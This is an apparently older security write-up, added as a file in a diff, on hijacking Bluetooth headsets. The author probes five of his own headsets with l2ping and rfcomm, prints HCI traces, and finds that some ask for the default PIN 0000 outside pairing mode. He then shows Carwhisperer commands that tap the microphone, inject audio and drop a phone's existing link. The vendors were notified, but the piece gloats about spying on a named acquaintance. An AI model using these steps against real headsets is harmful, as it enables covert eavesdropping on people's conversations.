@@ -1,0 +1,181 @@
+				Hijacking Bluetooth Headsets for Fun and Profit? 
+					kf[at]digitalmunition[dot]com
+				http://www.digitalmunition.com/HijackHeadSet.txt
+
+A few years ago when I worked for SNOSoft my business partner 'Simon' was one of those guys who rocked out 
+a Bluetooth Headset just about every time I talked to him on his cell phone. I loathed both him and those 
+other guys that you saw walking around mall with that Cardassian ear growth shit hanging off the side of 
+their head. I cursed both his headset and those of the other bastards I saw at the mall and on the roads! 
+I swore that one day his headset and all of theirs would feel my wrath! 
+
+In efforts to satisfy my thirst for Bluetooth I wound up purchasing several random headsets.  
+http://www.digitalmunition.com/HeadSets.jpg
+
+        00:03:89:AA:5A:AC       M2500 by Plantronics
+        00:07:A4:95:28:E2       Jabra BT110
+        00:15:0E:91:19:73       Anycom Stereo Headset
+        00:07:A4:21:ED:27       Jabra BT800
+        00:07:A4:79:05:3B       Motorola HS820
+
+By default none of these devices are discoverable. In order to 'see' each headset it must be placed into 
+'pairing mode'. 
+
+Even though the device is not discoverable you may manage to discover a headset via Ollie Whitehouse / 
+RedFang style techniques or through a barrage of L2CAP echo requests. If you do, in some cases you may be 
+able to eavesdrop on or spew propaganda at the owner of the headset. 
+
+Various headsets may or may not respond to L2CAP or RFCOMM requests depending on their current connection 
+state. Some headsets for example continue to service requests even though they are currently 'connected' 
+with a cell phone. This can obviously make them easy to find. Usually an l2ping to a device that is in 
+the 'connected' state results in 'Can't connect: Host is down'. 
+
+Of the 5 headsets that I own my Anycom headset is the only one that responds when 'connected'.  
+animosity:/home/kfinisterre# l2ping 00:15:0E:91:19:73
+Ping: 00:15:0E:91:19:73 from 00:11:B1:07:BE:A7 (data size 44) ...
+4 bytes from 00:15:0E:91:19:73 id 0 time 42.71ms
+4 bytes from 00:15:0E:91:19:73 id 1 time 35.34ms
+2 sent, 2 received, 0% loss
+
+When the devices are NOT connected with a cell phone the results change a bit. Some devices completely 
+refuse to respond, some respond with PIN Code Requests and others with Link Key Requests. 
+
+The Plantronics headset wanted me to send it a PIN Code... 
+
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: PIN Code Request (0x16) plen 6
+< HCI Command: PIN Code Request Negative Reply (0x01|0x000e) plen 6
+
+The Jabra BT110 simply will not respond at all. 
+animosity:/home/kfinisterre# l2ping 00:07:A4:95:28:E2
+Can't connect: Host is down
+
+The Anycom responds exactly as it did before. 
+animosity:/home/kfinisterre# l2ping 00:15:0E:91:19:73
+Ping: 00:15:0E:91:19:73 from 00:11:B1:07:BE:A7 (data size 44) ...
+4 bytes from 00:15:0E:91:19:73 id 0 time 41.72ms
+4 bytes from 00:15:0E:91:19:73 id 1 time 34.55ms
+4 bytes from 00:15:0E:91:19:73 id 2 time 39.32ms
+4 bytes from 00:15:0E:91:19:73 id 3 time 43.88ms
+4 sent, 4 received, 0% loss
+
+The Jabra BT800 simply refused the connection. Although the connection was refused. We were still able to 
+determine that the device existed based on the Invalid exchange response.  
+animosity:/home/kfinisterre# l2ping 00:07:A4:21:ED:27
+Can't connect: Invalid exchange
+
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: Connect Complete (0x03) plen 11
+
+The Motorola also refused but only AFTER a link key request was made. Again... we know it exists based on 
+the Invalid exchange response. Knowing that the device exists could aid in a future attack. 
+
+animosity:/home/kfinisterre# l2ping 00:07:A4:79:05:3B
+Can't connect: Invalid exchange
+
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: Link Key Request (0x17) plen 6
+< HCI Command: Link Key Request Negative Reply (0x01|0x000c) plen 6
+> HCI Event: Command Complete (0x0e) plen 10
+> HCI Event: Connect Complete (0x03) plen 11
+
+Since we got quite a variety of responses to the l2ping test it made sense to see how rfcomm connections
+worked out. 
+
+Upon connecting to the Plantronics it sends a PIN code request again. 
+
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: PIN Code Request (0x16) plen 6
+< HCI Command: PIN Code Request Negative Reply (0x01|0x000e) plen 6
+> HCI Event: Command Complete (0x0e) plen 10
+> HCI Event: Connect Complete (0x03) plen 11
+                                                 
+The Jabra BT110 as usual simply does not respond. 
+animosity:/home/kfinisterre# rfcomm connect 1 00:07:A4:95:28:E2 1
+Can't connect RFCOMM socket: Host is down
+
+This time the Anycom asks for a PIN code just like the Plantronics did. 
+
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: Connect Complete (0x03) plen 11
+< ACL data: handle 42 flags 0x02 dlen 12
+    L2CAP(s): Connect req: psm 3 scid 0x0040
+< HCI Command: Write Link Policy Settings (0x02|0x000d) plen 4
+> HCI Event: Command Complete (0x0e) plen 6
+> HCI Event: Number of Completed Packets (0x13) plen 5
+> HCI Event: Page Scan Repetition Mode Change (0x20) plen 7
+> ACL data: handle 42 flags 0x02 dlen 16
+    L2CAP(s): Connect rsp: dcid 0x0040 scid 0x0040 result 1 status 2
+      Connection pending - Authorization pending
+> HCI Event: Max Slots Change (0x1b) plen 3
+> HCI Event: PIN Code Request (0x16) plen 6
+< HCI Command: PIN Code Request Negative Reply (0x01|0x000e) plen 6
+> HCI Event: Command Complete (0x0e) plen 10
+> ACL data: handle 42 flags 0x02 dlen 16
+    L2CAP(s): Connect rsp: dcid 0x0000 scid 0x0040 result 3 status 0
+      Connection refused - security block
+> HCI Event: Disconn Complete (0x05) plen 4
+                                             
+
+The Jabra BT800 refuses the connection. 
+
+Can't connect RFCOMM socket: Invalid exchange
+
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: Connect Complete (0x03) plen 11
+
+The motorola also refuses again after a link key request. 
+
+Can't connect RFCOMM socket: Invalid exchange
+< HCI Command: Create Connection (0x01|0x0005) plen 13
+> HCI Event: Command Status (0x0f) plen 4
+> HCI Event: Link Key Request (0x17) plen 6
+< HCI Command: Link Key Request Negative Reply (0x01|0x000c) plen 6
+> HCI Event: Command Complete (0x0e) plen 10
+> HCI Event: Connect Complete (0x03) plen 11
+
+Obviously one interesting discovery was that 2 of the above headsets attempted to obtain a PIN code from us even 
+though they were not in pairing mode. Every single headset I own has a default PIN code of 0000. Because these
+devices are prompting to input a well known default PIN number and they are not in pairing mode the owners of 
+these devices are put are risk of being eavesdropped upon. 
+
+Both devices that asked us for a PIN code are vulnerable to a remote monitoring attack using the Trifinite Car 
+Whisperer http://trifinite.org/trifinite_downloads.html. Quite a few devices support multiple pairings so the 
+owner of the phone may not have any indication that an attack is occuring. 
+
+Using Car Whisperer allows us to both monitor the microphone of the headsets in question and to inject audio into 
+the ear piece. 
+
+animosity:/home/kfinisterre/carwhisperer-0.1# ./carwhisperer 0 eargasm.raw /tmp/out.raw 00:03:89:AA:5A:AC
+Voice setting: 0x0060
+RFCOMM channel connected
+SCO audio channel connected (handle 45, mtu 64)
+(inject propaganda and then read from the mic)
+
+In the case of the Anycom BSH-100 we are even able to terminate an existing connection with a cell phone before 
+we attack! Simply run Car Whisperer twice! The first connection will kill the link to the cell phone. 
+kfinisterre@animosity:~/carwhisperer-0.1$  ./carwhisperer 0 eargasm.raw /tmp/out.raw 00:15:0E:91:19:73
+Voice setting: 0x0060
+RFCOMM channel connected
+SCO audio channel connected (handle 45, mtu 64)
+(let em know I'm Rick James and then read from the mic)
+
+The issues I have outlined in this document occur because of poor implementation of the Bluetooth Head Set Profile. 
+Unless a headset has specifically been placed into 'pairing mode' it should NOT request a PIN Code upon connection 
+from a previously un-paired foreign device!  
+
+Both Plantronics and Anycom were notified about the above issues however neither company really made an effort to 
+communicate any plans to address the problems. Due to the fact that other vendors may be affected I have decided 
+to release this information. 
+
+So Simon I have to ask you do you still have that headset? If so keep the batteries fresh for me... I'm creeping on it!
+http://www.digitalmunition.com/creepin.jpg
+
+-KF
+
+
